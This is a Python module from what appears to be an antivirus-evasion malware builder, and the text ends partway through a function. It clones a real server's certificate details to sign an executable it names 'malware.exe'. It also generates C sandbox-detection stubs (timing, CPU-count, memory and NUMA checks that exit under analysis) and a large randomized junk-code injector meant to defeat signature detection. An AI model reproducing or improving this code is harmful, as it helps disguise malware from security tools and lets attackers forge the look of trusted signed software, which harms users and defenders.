import random

from lib import core
from OpenSSL import crypto
from pathlib import Path
from ssl import get_server_certificate
from subprocess import call, PIPE
from os import system
from random import randrange, randint, uniform, shuffle


def spoofer(host, port, filename, out):
    TIMESTAMP_URL = "http://sha256timestamp.ws.symantec.com/sha256/timestamp"
    try:
        ogcert = get_server_certificate((host, int(port)))
        x509 = crypto.load_certificate(crypto.FILETYPE_PEM, ogcert)
        certDir = Path('certs')
        certDir.mkdir(exist_ok=True)

        # Creating Fake Certificate
        cncrt = certDir / (host + ".crt")
        cnkey = certDir / (host + ".key")
        PFXFILE = certDir / (host + ".pfx")

        # Creating Keygen
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, ((x509.get_pubkey()).bits()))
        cert = crypto.X509()

        # Setting Cert details from loaded from the original Certificate
        cert.set_version(x509.get_version())
        cert.set_serial_number(x509.get_serial_number())
        cert.set_subject(x509.get_subject())
        cert.set_issuer(x509.get_issuer())
        cert.set_notBefore(x509.get_notBefore())
        cert.set_notAfter(x509.get_notAfter())
        cert.set_pubkey(k)
        cert.sign(k, 'sha256')
        cncrt.write_bytes(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        cnkey.write_bytes(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
        try:
            pfx = crypto.PKCS12()
        except AttributeError:
            pfx = crypto.PKCS12Type()
        pfx.set_privatekey(k)
        pfx.set_certificate(cert)
        pfxdata = pfx.export()
        PFXFILE.write_bytes(pfxdata)
        args = ("osslsigncode", "sign", "-pkcs12", PFXFILE, "-n", core.varname_creator(), "-i", TIMESTAMP_URL, "-in", filename, "-out", out)
        call(args, stdout=PIPE)
        certificate = host + ":" + port
        core.pe_signed(certificate)
        system(f"mv output/malware.exe {filename} && rm -rf certs/")

    except Exception as ex:
        core.bad_certificate(ex)


def sleeper(mseconds):
    tick = core.varname_creator()
    tac = core.varname_creator()
    stub = "int " + tick + "=GetTickCount();\n"
    stub += "Sleep(" + mseconds + ");\n"
    stub += "int " + tac + "=GetTickCount();\n"
    stub += "if ((" + tac + "-" + tick + ") < " + mseconds + "){\n"
    stub += "exit(0);}\n"
    return stub


def the_great_evasion(architecture, filename):
    evasion_code = ""
    evasion_list = [1, 2, 3, 4, 5]
    shuffle(evasion_list)
    for number in evasion_list:
        if number == 1:
            evasion_code += my_name_is(filename)

        elif number == 2:
            evasion_code += check_mono_core()

        elif number == 3:
            if architecture == "x86":
                pass
            else:
                evasion_code += check_multithread()

        elif number == 4:
            evasion_code += memory_decoy()

        elif number == 5:
            evasion_code += discrete_counter()

        elif number == 6:  # to edit
            evasion_code += av_memory()

    core.evasion_added()
    return evasion_code


def my_name_is(filename):
    filename = filename.replace('output/', '')
    evasion_code = f'\n\n\nif (strstr(argv[0], "{filename}") > 0)' + "{\n"
    evasion_code += "int i = 0;\n}"
    evasion_code += "else{\nexit(0);}\n"
    return evasion_code


def check_mono_core():
    sysguide = core.varname_creator()
    xcore = core.varname_creator()
    evasion_code = f"\n\n\nSYSTEM_INFO {sysguide};\n"
    evasion_code += f"GetSystemInfo(&{sysguide});\n"
    evasion_code += f"int {xcore} = {sysguide}.dwNumberOfProcessors;\n"
    evasion_code += f"if ({xcore} < 2)" + "{\nexit(0);}\n"
    return evasion_code


def check_multithread():
    mem = core.varname_creator()
    evasion_code = f"\n\n\nLPVOID {mem} = NULL;\n"
    evasion_code += f"{mem} = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);\n"
    evasion_code += f"if ({mem} != NULL)" + "{\n" + f'printf("{core.varname_creator()}");' + "\n}"
    evasion_code += "else{\nexit(0);}\n"
    return evasion_code


def memory_decoy():
    mem = str(randint(150000000, 400000000))
    ms = str(randint(5000, 60000))
    mem_dmp = core.varname_creator()
    tick = core.varname_creator()
    tack = core.varname_creator()
    evasion_code = "\n\n\nchar * " + mem_dmp + " = NULL;\n"
    evasion_code += mem_dmp + " = (char *) malloc(" + mem + ");\n"
    evasion_code += "if (" + mem_dmp + " != NULL){\n"
    evasion_code += "memset(" + mem_dmp + ", 00, " + mem + ");\n}"
    evasion_code += "int " + tick + " = GetTickCount();\n"
    evasion_code += "Sleep(" + ms + ");\n"
    evasion_code += "int " + tack + " = GetTickCount();\n"
    evasion_code += "if ((" + tack + " - " + tick + ") < " + ms + "){\nexit(0);}\n"
    evasion_code += "free(" + mem_dmp + ");\n"
    return evasion_code


def discrete_counter():
    operation = core.varname_creator()
    counter = core.varname_creator()
    dyn_counter = core.varname_creator()
    evasion_code = "\n\n\nsigned long long int " + operation + " =" + str(randint(10000000000, 30000000000)) + ";\n"
    evasion_code += "signed long long int " + counter + " = 0;\n"
    evasion_code += "signed long long int " + dyn_counter + " = 0;\n"
    evasion_code += "for (" + dyn_counter + " =0; " + dyn_counter + " < " + operation + "; " + dyn_counter + "++){" + counter + "++;}"
    evasion_code += "if (" + counter + " != " + operation + "){\nexit(0);}\n"
    return evasion_code


def av_memory():
    pmc = core.varname_creator()
    evasion_code = "\n\n\nPROCESS_MEMORY_COUNTERS " + pmc + ";\n"
    evasion_code += "GetProcessMemoryInfo(GetCurrentProcess(), & " + pmc + ", sizeof(" + pmc + "));\n"
    evasion_code += "if (" + pmc + '.WorkingSetSize <= 3500000){\nprintf("' + core.varname_creator() + '");}\n'
    evasion_code += "else{\nexit(0);}\n"
    return evasion_code


def junk_inject(raw_code):
    junked_code = ""
    for line in raw_code:
        if line == "\n":
            junked_code += line.replace(line, junk_code())
        else:
            junked_code += line
    core.junkcode_added()
    return junked_code


def junk_code():
    code = ""
    number = randint(8, 32)
    injection = 0

    while injection != number:
        injection += 1
        H = randint(32, 64)
        rand_junk = randint(1, 52)   # 1 - 52

        if rand_junk == 1:
            code += sum_first_n_integer_1(H)

        elif rand_junk == 2:
            code += sum_first_n_inter_2(H)

        elif rand_junk == 3:
            code += fibonacci(H)

        elif rand_junk == 4:
            code += twin_tower(H)

        elif rand_junk == 5:
            code += back_to_zero(H)

        elif rand_junk == 6:
            code += back_to_num_1(H)

        elif rand_junk == 7:
            code += back_to_num_2(H)

        elif rand_junk == 8:
            code += primes_number_soe(H)

        elif rand_junk == 9:
            code += primes_number_sos(H)

        elif rand_junk == 10:
            code += average_1(H)

        elif rand_junk == 11:
            code += average_2(H)

        elif rand_junk == 12:
            code += average_variance_stanard_and_deviation_1(H)

        elif rand_junk == 13:
            code += average_variance_stanard_and_deviation_2(H)

        elif rand_junk == 14:
            code += reverse_array_1(H)

        elif rand_junk == 15:
            code += reverse_array_2(H)

        elif rand_junk == 16:
            code += double_reverse_array_1(H)

        elif rand_junk == 17:
            code += double_reverse_array_2(H)

        elif rand_junk == 18:
            code += random_numbers(H)

        elif rand_junk == 19:
            code += buble_sort_int_array(H)

        elif rand_junk == 20:
            code += buble_sort_float_array(H)

        elif rand_junk == 21:
            code += gnome_sort_int_array(H)

        elif rand_junk == 22:
            code += last_armstrong(H)

        elif rand_junk == 23:
            code += odd_or_even_1(H)

        elif rand_junk == 24:
            code += odd_or_even_2(H)

        elif rand_junk == 25:
            code += ceil_routine_1(H)

        elif rand_junk == 26:
            code += ceil_routine_2(H)

        elif rand_junk == 27:
            code += floor_routine_1(H)

        elif rand_junk == 28:
            code += floor_routine_2(H)

        elif rand_junk == 29:
            code += acos_routine_1(H)

        elif rand_junk == 30:
            code += acos_routine_2(H)

        elif rand_junk == 31:
            code += asin_routine_1(H)

        elif rand_junk == 32:
            code += asin_routine_2(H)

        elif rand_junk == 33:
            code += atan_routine_1(H)

        elif rand_junk == 34:
            code += atan_routine_2(H)

        elif rand_junk == 35:
            code += fabs_routine_1(H)

        elif rand_junk == 36:
            code += fabs_routine_2(H)

        elif rand_junk == 37:
            code += exp_routine_1(H)

        elif rand_junk == 38:
            code += exp_routine_2(H)

        elif rand_junk == 39:
            code += ln_routine_1(H)

        elif rand_junk == 40:
            code += ln_routine_2(H)

        elif rand_junk == 41:
            code += log10_routine_1(H)

        elif rand_junk == 42:
            code += log10_routine_2(H)

        elif rand_junk == 43:
            code += fmod_routine_1(H)

        elif rand_junk == 44:
            code += fmod_routine_2(H)

        elif rand_junk == 45:
            code += ldexp_routine_1(H)

        elif rand_junk == 46:
            code += ldexp_routine_2(H)

        elif rand_junk == 47:
            code += geometric_1(H)

        elif rand_junk == 48:
            code += geometric_2(H)

        elif rand_junk == 49:
            code += geometric_3(H)

        elif rand_junk == 50:
            code += geometric_4(H)

        elif rand_junk == 51:
            code += geometric_5(H)
            
        elif rand_junk == 52:
            code += shaker_snort(H)

    return code


def sum_first_n_integer_1(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randcounter = core.varname_creator()
    randcounter2 = core.varname_creator()
    randcounter3 = core.varname_creator()
    randbignumb = str(randint(XH1 * H, XH2 * H))
    junkcode = f"int {randcounter},{randcounter2};"
    junkcode += f"unsigned long long int {randcounter3} = 0;"
    junkcode += f"{randcounter2} = {randbignumb};"
    junkcode += f"for ({randcounter} = 1; {randcounter} <= {randcounter2}; {randcounter}++)" + "{"
    junkcode += f"{randcounter3} = {randcounter3} + {randcounter};" + "}"
    return junkcode


def sum_first_n_inter_2(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randcounter = core.varname_creator()
    randcounter2 = core.varname_creator()
    randbignumb = str(randint(XH1 * H, XH2 * H))
    junkcode = f"int {randcounter};"
    junkcode += f"unsigned long long int {randcounter2} = 0;"
    junkcode += f"{randcounter} = {randbignumb};"
    junkcode += f"while({randcounter} > 0)" + "{"
    junkcode += f"{randcounter2} = {randcounter2} + {randcounter};"
    junkcode += f"{randcounter} = {randcounter} - 1;" + "}"
    return junkcode


def fibonacci(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    rand1 = core.varname_creator()
    rand2 = core.varname_creator()
    rand3 = core.varname_creator()
    rand4 = core.varname_creator()
    rand5 = core.varname_creator()
    randbignumb = str(randint(XH1 * H, XH2 * H))
    junkcode = f"int {rand1} = 0,{rand2} = 1,{rand3},{rand4},{rand5} = 0;"
    junkcode += f"{rand4} = {randbignumb};"
    junkcode += f"while ({rand5} < {rand4})" + "{"
    junkcode += f"{rand3} = {rand1} + {rand2};{rand5}++;"
    junkcode += f"{rand1} = {rand2};{rand2} = {rand3};" + "}"
    return junkcode


def twin_tower(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randbig1 = str(randrange(XH1 * H, XH2 * H, 10))
    randbig2 = str(randrange(XH1 * H, XH2 * H, 10))
    randcpt = core.varname_creator()
    randcpt2 = core.varname_creator()
    junkcode = f"int {randcpt} = {randbig1};"
    junkcode += f"int {randcpt2} = {randbig2};"
    junkcode += f"while ({randcpt} > 0 )" + "{"
    junkcode += f"if ({randcpt} > {randcpt2})" + "{"
    junkcode += randcpt + f" = " + randcpt + " - 1;"
    junkcode += "}else{"
    junkcode += f"{randcpt2} = {randcpt2} - 1;" + "}}"
    return junkcode


def back_to_zero(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randbig1 = str(randrange(XH1 * H, XH2 * H, 10))
    randcpt = core.varname_creator()
    junkcode = f"int {randcpt}  = {randbig1};"
    junkcode += f"while ({randcpt} > 0)" + "{"
    junkcode += f"{randcpt} = {randcpt} - 1;" + "}"
    return junkcode


def pow_counter(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randsmall = str(uniform(1.000001000, 1.000009999))
    randsmall2 = str(uniform(1.000001000, 1.000009999))
    randbig = str(randrange(XH1 * H, XH2 * H, 10))
    randcpt = core.varname_creator()
    randi = core.varname_creator()
    junkcode = "double " + randcpt + "  = " + randsmall + ";"
    junkcode += "double " + randi + " = " + randsmall2 + ";"
    junkcode += "while(" + randcpt + " < " + randbig + "){"
    junkcode += randcpt + " = pow(" + randcpt + "," + randi + ");}"
    return junkcode


def back_to_num_1(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randbig1 = str(randrange(XH1 * H, XH2 * H, 10))
    randcpt = core.varname_creator()
    junkcode = "int " + randcpt + "  = " + randbig1 + ";"
    junkcode += "while ( " + randcpt + " > " + str(randrange(10, 99, 2)) + " ){"
    junkcode += randcpt + " = " + randcpt + " - 1;}"
    return junkcode


def back_to_num_2(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randbig1 = str(randrange(XH1 * H, XH2 * H, 10))
    randcpt = core.varname_creator()
    randcpt2 = core.varname_creator()
    junkcode = "int " + randcpt + ";"
    junkcode += "int " + randcpt2 + " = " + randbig1 + ";"
    junkcode += "for(" + randcpt + " = " + randbig1 + ";" + randcpt + " > " + str(randrange(10, 99, 2)) + ";" + randcpt + "--){"
    junkcode += randcpt2 + " = " + randcpt2 + " - 1;}"
    return junkcode


def primes_number_sos(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randarraysize = core.varname_creator()
    randranges = str(randint(XH1 * H, XH2 * H))
    randprimevar = core.varname_creator()
    randprimenumb = core.varname_creator()
    randsizevar = core.varname_creator()
    isprime = core.varname_creator()
    randn = core.varname_creator()
    randflag = core.varname_creator()
    randflag2 = core.varname_creator()
    junkcode = "int " + randflag + "," + randflag2 + ";"
    junkcode += "int " + randprimevar + " = 0;"
    junkcode += "int " + randarraysize + " = " + randranges + ";"
    junkcode += "int " + randn + " = " + randranges + " / 2;"
    junkcode += "int " + randsizevar + ";"
    junkcode += "int* " + isprime + " = (int*)malloc(sizeof(int) * (" + randarraysize + " + 1));"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randn + ";" + randflag + "++){"
    junkcode += isprime + "[" + randflag + "] = " + randflag + ";}"
    junkcode += "for(" + randflag + " = 1;" + randflag + " < " + randn + ";" + randflag + "++){"
    junkcode += "for(" + randflag2 + " = " + randflag + ";" + randflag2 + " <= (" + randn + " - " + randflag + ")/(2 * " + randflag + " + 1);" + randflag2 + "++){"
    junkcode += isprime + "[" + randflag + " + " + randflag2 + " + 2 * " + randflag + " + " + randflag2 + "] = 0;}}"
    junkcode += "if(" + randarraysize + " > 2){"
    junkcode += isprime + "[" + randprimevar + "++] = 2;}"
    junkcode += "for(" + randflag + " = 1;" + randflag + " < " + randn + ";" + randflag + "++){"
    junkcode += "if(" + isprime + "[" + randflag + "] != 0){"
    junkcode += isprime + "[" + randprimevar + "++] = " + randflag + " * 2 + 1;}}"
    junkcode += randsizevar + " = sizeof " + isprime + " / sizeof(int);"
    junkcode += "int " + randprimenumb + " = 0;"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randsizevar + ";" + randflag + "++){"
    junkcode += "if(" + isprime + "[" + randflag + "] != 0){"
    junkcode += randprimenumb + " ++;}}"
    junkcode += "free(" + isprime + ");"
    return junkcode


def primes_number_soe(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randprimevar = core.varname_creator()
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    randflag2 = core.varname_creator()
    junkcode = "unsigned long long int " + randflag + "," + randflag2 + ";"
    junkcode += "int *" + randprimevar + ";"
    junkcode += "int " + randvar + " = 1;"
    junkcode += randprimevar + " = (int*)malloc(sizeof(int) * " + randranges + ");"
    junkcode += "for(" + randflag + " = 2;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randprimevar + "[" + randflag + "] = 1;}"
    junkcode += "for(" + randflag + " = 2;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += "if(" + randprimevar + "[" + randflag + "]){"
    junkcode += "for(" + randflag2 + " = " + randflag + ";" + randflag + " * " + randflag2 + " < " + randranges + ";" + randflag2 + "++){"
    junkcode += randprimevar + "[" + randflag + " * " + randflag2 + "] = 0;}}}"
    junkcode += "free(" + randprimevar + ");"
    return junkcode


def average_1(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randsum = core.varname_creator()
    randsum2 = core.varname_creator()
    randaverage = core.varname_creator()
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + ";"
    junkcode += "int* " + randvar + " = (int*)malloc(sizeof(int) * " + randranges + ");"
    junkcode += "int " + randsum + " = 0;int " + randsum2 + " = 0;"
    junkcode += "float " + randaverage + ";"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = rand() % 30;}"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randsum + " = " + randsum + " + " + randvar + "[" + randflag + "];}"
    junkcode += randaverage + "/((float)" + randranges + ");"
    junkcode += "free(" + randvar + ");"
    return junkcode


def average_2(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randsum = core.varname_creator()
    randsum2 = core.varname_creator()
    randaverage = core.varname_creator()
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + ";"
    junkcode += "int " + randsum + " = 0;int " + randsum2 + " = 0;"
    junkcode += "int* " + randvar + " = (int*)malloc(sizeof(int) * " + randranges + ");"
    junkcode += "float " + randaverage + ";"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = rand() % 25;"
    junkcode += randsum + " = " + randsum + " + " + randvar + "[" + randflag + "];}"
    junkcode += randaverage + "/((float)" + randranges + ");"
    junkcode += "free(" + randvar + ");"
    return junkcode


def average_variance_stanard_and_deviation_1(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randsum = core.varname_creator()
    randsum2 = core.varname_creator()
    randaverage = core.varname_creator()
    randvariance = core.varname_creator()
    randdevstd = core.varname_creator()
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int* " + randvar + " = (int*)malloc(sizeof(int) * " + randranges + ");"
    junkcode += "int " + randflag + ";"
    junkcode += "int " + randsum + " = 0;int " + randsum2 + " = 0;"
    junkcode += "float " + randaverage + "," + randvariance + "," + randdevstd + ";"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = rand() % 35;}"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randsum + " = " + randsum + " + " + randvar + "[" + randflag + "];}"
    junkcode += randaverage + "/((float)" + randranges + ");"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randsum2 + " = " + randsum2 + " + pow((" + randvar + "[" + randflag + "]" + " - " + randaverage + "),2);}"
    junkcode += randvariance + " = " + randsum2 + "/((float)" + randranges + ");"
    junkcode += randdevstd + " = sqrt(" + randvariance + ");"
    junkcode += "free(" + randvar + ");"
    return junkcode


def average_variance_stanard_and_deviation_2(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randsum = core.varname_creator()
    randsum2 = core.varname_creator()
    randaverage = core.varname_creator()
    randvariance = core.varname_creator()
    randdevstd = core.varname_creator()
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randsum + " = 0;int " + randsum2 + " = 0;"
    junkcode += "int *" + randvar + " = (int*)malloc(sizeof(int)*" + randranges + ");"
    junkcode += "float " + randaverage + "," + randvariance + "," + randdevstd + ";"
    junkcode += "int " + randflag + ";"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = rand() % 35;"
    junkcode += randsum + " = " + randsum + " + " + randvar + "[" + randflag + "];}"
    junkcode += randaverage + "/((float)" + randranges + ");"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randsum2 + " = " + randsum2 + " + pow((" + randvar + "[" + randflag + "]" + " - " + randaverage + "),2);}"
    junkcode += randvariance + " = " + randsum2 + "/((float)" + randranges + ");"
    junkcode += randdevstd + " = sqrt(" + randvariance + ");"
    junkcode += "free(" + randvar + ");"
    return junkcode


def reverse_array_1(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randrevvar = core.varname_creator()
    randflag = core.varname_creator()
    randlenght = core.varname_creator()
    junkcode = "int " + randflag + ";"
    junkcode += "int* " + randvar + " = (int*)malloc(sizeof(int) * " + randranges + ");"
    junkcode += "int* " + randrevvar + " = (int*)malloc(sizeof(int) * " + randranges + ");"
    junkcode += "int " + randlenght + " = " + randranges + " - 1;"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = rand() % 300;}"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randrevvar + "[" + randflag + "] = " + randvar + "[" + randlenght + "];"
    junkcode += randlenght + " = " + randlenght + " - 1;}"
    junkcode += "free(" + randvar + ");free(" + randrevvar + ");"
    return junkcode


def reverse_array_2(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randrevvar = core.varname_creator()
    randflag = core.varname_creator()
    randLenght = core.varname_creator()
    junkcode = "int " + randflag + ";"
    junkcode += "int* " + randvar + " = (int*)malloc(sizeof(int) * " + randranges + ");"
    junkcode += "int* " + randrevvar + " = (int*)malloc(sizeof(int) * " + randranges + ");"
    junkcode += "int " + randLenght + " = " + randranges + " - 1;"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = rand() % 300;"
    junkcode += randrevvar + "[" + randflag + "] = " + randvar + "[" + randLenght + "];"
    junkcode += randLenght + " = " + randLenght + " - 1;}"
    junkcode += "free(" + randvar + ");free(" + randrevvar + ");"
    return junkcode


def double_reverse_array_1(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randrevvar = core.varname_creator()
    randvar2 = core.varname_creator()
    randrevvar2 = core.varname_creator()
    randflag = core.varname_creator()
    randLenght = core.varname_creator()
    junkcode = "int " + randflag + ";"
    junkcode += "int* " + randvar + " = (int*)malloc(sizeof(int) * " + randranges + ");"
    junkcode += "int* " + randvar2 + " = (int*)malloc(sizeof(int) * " + randranges + ");"
    junkcode += "int* " + randrevvar + " = (int*)malloc(sizeof(int) * " + randranges + ");"
    junkcode += "int* " + randrevvar2 + " = (int*)malloc(sizeof(int) * " + randranges + ");"
    junkcode += "int " + randLenght + " = " + randranges + " - 1;"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = rand() % 300;"
    junkcode += randvar2 + "[" + randflag + "] = rand() % 300;}"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randrevvar + "[" + randflag + "] = " + randvar + "[" + randLenght + "];"
    junkcode += randrevvar2 + "[" + randflag + "] = " + randvar2 + "[" + randLenght + "];"
    junkcode += randLenght + " = " + randLenght + " - 1;}"
    junkcode += "free(" + randvar + ");free(" + randvar2 + ");free(" + randrevvar + ");free(" + randrevvar2 + ");"
    return junkcode


def double_reverse_array_2(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randrevvar = core.varname_creator()
    randvar2 = core.varname_creator()
    randrevvar2 = core.varname_creator()
    randflag = core.varname_creator()
    randLenght = core.varname_creator()
    junkcode = "int " + randflag + ";"
    junkcode += "int* " + randvar + " = (int*)malloc(sizeof(int) * " + randranges + ");"
    junkcode += "int* " + randvar2 + " = (int*)malloc(sizeof(int) * " + randranges + ");"
    junkcode += "int* " + randrevvar + " = (int*)malloc(sizeof(int) * " + randranges + ");"
    junkcode += "int* " + randrevvar2 + " = (int*)malloc(sizeof(int) * " + randranges + ");"
    junkcode += "int " + randLenght + " = " + randranges + " - 1;"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = rand() % 300;"
    junkcode += randvar2 + "[" + randflag + "] = rand() % 300;"
    junkcode += randrevvar + "[" + randflag + "] = " + randvar + "[" + randLenght + "];"
    junkcode += randrevvar2 + "[" + randflag + "] = " + randvar2 + "[" + randLenght + "];"
    junkcode += randLenght + " = " + randLenght + " - 1;}"
    junkcode += "free(" + randvar + ");free(" + randvar2 + ");free(" + randrevvar + ");free(" + randrevvar2 + ");"
    return junkcode


def random_numbers(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvarr = core.varname_creator()
    randflag = core.varname_creator()
    randflag2 = core.varname_creator()
    junkcode = "int " + randflag + "," + randflag2 + " = 0;"
    junkcode += "float* " + randvarr + " = (float*)malloc(sizeof(float) * " + randranges + ");"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randflag2 + " = rand() % 400;"
    junkcode += "if(" + randflag2 + " > 360){"
    junkcode += randvarr + "[" + randflag + "] = 0;"
    junkcode += "}else if(" + randflag2 + " < 0){"
    junkcode += randvarr + "[" + randflag + "] = 0;"
    junkcode += "}else{"
    junkcode += randvarr + "[" + randflag + "] = " + randflag2 + " * 0.1 / 360;}}"
    junkcode += "free(" + randvarr + ");"
    return junkcode


def buble_sort_int_array(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randvar2 = core.varname_creator()
    randflag = core.varname_creator()
    randflag2 = core.varname_creator()
    junkcode = "int *" + randvar + " = (int*)malloc(sizeof(int)*" + randranges + ");"
    junkcode += "int " + randflag + ";"
    junkcode += "int " + randflag2 + ";"
    junkcode += "int " + randvar2 + ";"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = rand() % 10000 ;}"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += "for(" + randflag2 + " = 0;" + randflag2 + " < (" + randranges + " - " + randflag + " - 1);" + randflag + "++){"
    junkcode += "if(" + randvar + "[" + randflag + "] > " + randvar + "[" + randflag2 + " + 1]){"
    junkcode += randvar2 + " = " + randvar + "[" + randflag2 + "];"
    junkcode += randvar + "[" + randflag2 + "] = " + randvar + "[" + randflag + " + 1];"
    junkcode += randvar + "[" + randflag2 + " + 1] = " + randvar2 + ";}}}"
    junkcode += "free(" + randvar + ");"
    return junkcode


def buble_sort_float_array(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randvar2 = core.varname_creator()
    randflag = core.varname_creator()
    randflag2 = core.varname_creator()
    junkcode = "float *" + randvar + " = (float*)malloc(sizeof(float)*" + randranges + ");"
    junkcode += "int " + randflag + ";"
    junkcode += "int " + randflag2 + ";"
    junkcode += "float " + randvar2 + ";"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = (float)(rand() % 1000) / (float)(rand() % 70);}"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += "for(" + randflag2 + " = 0;" + randflag2 + " < (" + randranges + " - " + randflag + " - 1);" + randflag + "++){"
    junkcode += "if(" + randvar + "[" + randflag + "] > " + randvar + "[" + randflag2 + " + 1]){"
    junkcode += randvar2 + " = " + randvar + "[" + randflag2 + "];"
    junkcode += randvar + "[" + randflag2 + "] = " + randvar + "[" + randflag + " + 1];"
    junkcode += randvar + "[" + randflag2 + " + 1] = " + randvar2 + ";}}}"
    junkcode += "free(" + randvar + ");"
    return junkcode


def gnome_sort_int_array(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randtemp = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int *" + randvar + " = (int*)malloc(sizeof(int)*" + randranges + ");"
    junkcode += "int " + randflag + ";"
    junkcode += "int " + randtemp + ";"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = rand() % 10000;}"
    junkcode += randflag + "=0;"
    junkcode += "while(" + randflag + " < " + randranges + "){"
    junkcode += "if(" + randflag + " == 0 || " + randvar + "[" + randflag + "-1] <= " + randvar + "[" + randflag + "]){"
    junkcode += randflag + "++;"
    junkcode += "}else{"
    junkcode += randtemp + " = " + randvar + "[" + randflag + "-1];"
    junkcode += randvar + "[" + randflag + "-1] = " + randvar + "[" + randflag + "];"
    junkcode += randvar + "[" + randflag + "] = " + randtemp + ";"
    junkcode += randflag + " = " + randflag + "-1;}}"
    junkcode += "free(" + randvar + ");"
    return junkcode


def last_armstrong(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randvar2 = core.varname_creator()
    randflag = core.varname_creator()
    randflag2 = core.varname_creator()
    randLastArmN = core.varname_creator()
    junkcode = "int " + randLastArmN + ";"
